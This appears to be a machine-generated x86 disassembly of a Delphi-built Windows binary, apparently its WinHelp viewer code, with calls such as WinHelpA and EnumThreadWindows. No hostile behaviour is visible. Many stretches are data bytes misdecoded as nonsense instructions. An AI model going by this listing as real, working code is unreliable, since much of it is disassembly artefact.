add [ eax ] al
add [ eax + 0x2b ] ah
inc esp
add [ edx + ebp + 0x44 ] bh
add [ eax ] al
pushad
sub eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x2b ] bh
inc esp
add [ eax + eax ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
jo r-xdata
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_442c41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eb8
test edi edi
jne r-xdata
inc eax
add [ eax + ebx * 2 ] dh
inc eax
add [ eax + 0x58 ] al
inc eax
add [ ebx + esi + 0x33780040 ] al
inc eax
add [ eax + 0x58 ] dl
inc eax
add ah bl
xor [ eax ] al
add [ esi ] dh
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
sub al 0xc9
inc edx
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f50
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442c48
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404238
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_442b8c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_442c41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eb8
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f50
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442c48
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404238
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_442c5c
push ebx
mov ebx eax
mov eax ebx
call sub_442f8c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4057b4
sub_442c98
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442cff
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_442b8c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442d06
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_442d10
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_442d98
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_442c84
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404238
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442d9f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
sub_442dab
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_442e33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4434d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442e3a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_442b8c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_442db8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_442e33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4434d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442e3a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_442b8c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_442e40
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442f38
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_442b8c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f48
mov eax ebx
call sub_4434d0
test al al
je r-xdata
mov ecx sub_4429e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f3f
lea eax [ ebp - 0x1c ]
call sub_403eb8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_442b8c
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_443428
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f0c
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404378
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_442fa8
push ebx
mov ebx eax
mov eax ebx
call sub_442f8c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4057b4
pop ebx
retn
mov eax rw-data
call sub_4057b4
sub_442fd8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_443030
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443037
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_442b8c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_443040
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443136
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408f08
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_442b8c
mov eax ebx
call sub_4434d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44313d
lea eax [ ebp - 0x110 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404128
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_443428
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404128
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443154
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4431b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4431bd
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_442b8c
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_4431c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443248
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_442b8c
mov eax ebx
call sub_4434d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44324f
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_443428
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443258
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_443343
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_4434d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44334a
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403edc
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_4080a8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_443428
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_4080a8
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403f0c
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_442b8c
mov eax [ ebp - 0x14 ]
call sub_404378
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_443358
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_40896c
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_4433b3
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408948
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_443428
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404368
xor eax eax
push ebp
push sub_44349e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_44340c
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4434a5
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407dd0
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_4434b4
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_4434d0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_44340c
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_4434b0
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_4434b4
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_44352c
sub_44352c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_4435a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_442f8c
call GetTickCount
mov ebx eax
push 0x0
call sub_4062f8
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_442b8c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4435b0
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4435b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_40348c
call sub_4057cc
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_443600
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_44362c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44369a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4436a1
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4057b4
mov eax rw-data
call sub_4057b4
mov eax rw-data
call sub_4057b4
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_4057b4
mov eax [ rw-data ]
call sub_442c5c
sub_4436a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4436f6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4436fd
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4435b8
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4057b4
mov edx eax
mov eax [ rw-data ]
call sub_42cbcc
sub_443700
add al 0x37
inc esp
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
or al 0x65
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x38 ] si
inc esp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 8 + 0x37 ] si
inc esp
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
and [ edi ] dh
inc esp
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc esp
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc eax
add ah bl
aaa
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp + 0x44 ] bl
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
movsb [ edi ] [ esi ]
arpl [ eax + eax - 0x18 ] ax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
inc esp
add [ eax + eax ] dh
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
jae r-xdata
add al dh
cmp [ eax + eax + 0x40 ] eax
add [ eax ] al
add [ eax + edi + 0x33700044 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ ebp + 0x44 ] bl
inc esp
jb r-xdata
add [ 0x540d0044 ] cl
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax + eax + 0x34 ] al
add [ eax ] al
add [ eax + 0x70004010 ] dh
xor eax [ eax ]
insb
inc esp
jb r-xdata
inc esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
add al ch
arpl [ eax + eax - 0x5c ] ax
inc esp
add [ ebx + 0x65000044 ] ch
inc esp
add [ 0x650c0044 ] al
inc esp
add al dl
inc esp
add [ eax + 0x16004465 ] al
push esp
inc edx
popad
jae r-xdata
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
add [ ecx ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi ] ch
inc esp
add [ eax + eax ] bh
add [ eax ] al
nop
aaa
inc esp
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ ebp + 0x44 ] bl
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
cld
inc esp
add al ch
inc esp
add ah ah
inc esp
add [ ebp + 0x44 ] bh
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
movsb [ edi ] [ esi ]
arpl [ eax + eax - 0x18 ] ax
inc esp
add ah ah
inc esp
add al ch
arpl [ eax + eax + 0x4c ] ax
arpl [ eax + eax - 0x54 ] ax
arpl [ eax + eax ] ax
inc esp
add [ 0x650c0044 ] al
inc esp
add [ 0x61724454 ] cl
add [ ebx + 0x443880c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x380044 ] ah
add [ eax ] al
nop
aaa
inc esp
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
cmp [ edi ] dh
inc esp
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ edi + esi ] dh
inc esp
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc esp
inc ebx
outsd
outsb
je r-xdata
add al dl
inc esp
add [ eax + 0x14004465 ] al
push esp
inc esp
jb r-xdata
inc esp
add [ esi + 0x44 ] dh
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x50 ] si
cmp al [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi + 0x44 ] bh
add [ eax ] al
add [ eax ] al
js r-xdata
add [ ebx + esi + 0x33780040 ] al
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x48 ] si
cmp [ eax + eax + 0x7 ] eax
push ss
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc esp
add [ eax + 0x33 ] dh
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + esi + 0x3b ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x3a ] si
inc esp
add [ ecx + edi + 0x44 ] al
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ 0x650c0044 ] al
inc esp
add [ eax - 0x67ffbb99 ] cl
inc sp
add al dl
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
loopne r-xdata
add [ 0x66740044 ] al
inc esp
add [ esi + 0x44 ] dl
add [ eax + 0x66 ] cl
inc esp
add al ch
arpl [ eax + eax - 0x5c ] ax
inc esp
add [ ebx + 0x66540044 ] ch
inc esp
inc esp
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ esi + 0x33840044 ] dl
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
cld
inc esp
add [ eax ] dh
inc sp
js r-xdata
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
add ah ah
inc esp
add al ch
arpl [ eax + eax + 0x4c ] ax
arpl [ eax + eax - 0x54 ] ax
arpl [ eax + eax ] ax
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ebx + 0x64e80044 ] ah
inc esp
outsd
insd
inc esp
inc esp
add [ eax + ebp * 2 + 0x44 ] cl
add [ eax + 0x68 ] ah
inc esp
add [ eax + 0x11004468 ] al
push esp
inc esp
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bh
inc sp
add ah bh
inc esp
add [ eax + ebp * 2 + 0x44 ] dh
add ah ah
inc esp
add al ch
arpl [ eax + eax + 0x2c ] ax
inc esp
add [ ebx + 0x65000044 ] ch
inc esp
add [ 0x650c0044 ] al
inc esp
add [ eax - 0x67ffbb99 ] cl
inc sp
add al dl
add [ eax - 0x2fffbb9a ] bl
add [ 0x67880044 ] cl
inc esp
outsd
insb
jae r-xdata
js r-xdata
add [ eax + ebp * 2 + 0x44 ] dh
add ah ah
inc esp
add al ch
arpl [ eax + eax + 0x2c ] ax
inc esp
add [ ebx + 0x65000044 ] ch
inc esp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi ] bl
inc esp
add [ eax ] dh
add [ eax ] al
mov ah 0x38
inc esp
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ ebp + 0x44 ] bl
add [ ebx + esi + 0x33780040 ] al
inc esp
add [ eax + 0x12004465 ] al
push esp
inc esp
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
cld
inc esp
add [ eax ] dh
inc sp
add [ eax + 0x33 ] bh
inc ebx
outsd
outsb
je r-xdata
add [ 0x650c0044 ] al
add [ ebp + 0x44 ] ah
je r-xdata
inc ecx
add [ ecx * 4 + 0x53dc0041 ] dl
inc esp
